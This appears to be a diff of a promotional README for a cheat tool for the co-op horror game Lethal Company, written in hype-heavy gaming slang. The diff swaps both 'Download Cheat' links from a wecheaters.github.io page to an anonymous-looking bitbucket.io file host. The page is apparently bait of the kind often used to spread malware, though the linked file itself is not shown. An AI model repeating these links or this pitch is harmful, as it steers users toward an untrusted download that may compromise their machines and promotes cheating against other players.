@@ -4,14 +4,14 @@
 
 If you're grinding through **Lethal Company** and tired of the same rinse-repeat gameplay, it’s time to level up with a **Lethal Company cheat** that flips the whole game on its head. Whether you're tired of sneaking around in the dark or just wanna rake in loot like a digital billionaire, cheats got your back.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/lethal-company/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🎮 What is Lethal Company?
 
 For those living under a space rock, **Lethal Company** is a co-op horror survival game where you and your squad are scavenging abandoned moons for scrap. Simple? Think again. One wrong move, and you’re being hunted by terrifying creatures in pitch-black hallways. That's where this cheat comes in—giving you total control over the chaos.
 
-[![Download Cheat](https://i.ytimg.com/vi/A0gYI722yr8/maxresdefault.jpg)](https://wecheaters.github.io/cheats/lethal-company/)
+[![Download Cheat](https://i.ytimg.com/vi/A0gYI722yr8/maxresdefault.jpg)](https://fileoffload14.bitbucket.io)
 ---
 
 ## 🧩 Product Description
